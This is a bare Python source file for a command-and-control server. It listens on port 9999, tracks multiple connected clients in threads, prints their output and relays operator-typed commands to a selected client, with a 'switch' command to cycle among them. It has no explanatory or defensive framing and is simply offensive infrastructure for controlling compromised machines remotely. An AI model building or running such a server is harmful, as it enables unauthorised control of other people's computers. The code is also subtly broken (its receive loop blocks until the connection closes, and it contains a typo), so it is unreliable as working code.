import socket
import threading

class C2Server:
    def __init__(self, host="0.0.0.0", port=9999):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}
        self.current_client = None
        self.lock = threading.Lock()
    
    def start_server(self):
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] C2 server started on {self.host}:{self.port}")

        while True:
            client, addr = self.server.accept()
            print(f"[*] Connection establisted from {addr}")

            with self.lock:
                self.clients[addr] = client
                client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
                client_thread.start()
    
    def handle_client(self, client, addr):
        while True:
            try:
                buf = b''
                while True:
                    data = client.recv(4096)
                    if data:
                        buf += data
                    else:
                        break
                print(buf)
                command = input()
                if command.lower().strip() == "switch":
                    with self.lock:
                        self.switch_client()
                if self.current_client:
                    self.current_client.send(command.encode())
            except Exception:
                print(f"[*] Connection lost with {addr}")
                with self.lock:
                    del self.clients[addr]
                break
    
    def switch_client(self):
        if len(self.clients) > 0:
            clients_list = list(self.clients.values())
            if self.current_client:
                current_index = clients_list.index(self.current_client)
                self.current_client = clients_list[(current_index + 1) % len(clients_list)]
            else:
                self.current_client = clients_list[0]
            print(f"[*] Switched to a new client: {self.current_client.getpeername()}")
        else:
            print("[*] No clients connected")

if __name__ == "__main__":
    server = C2Server()
    server.start_server()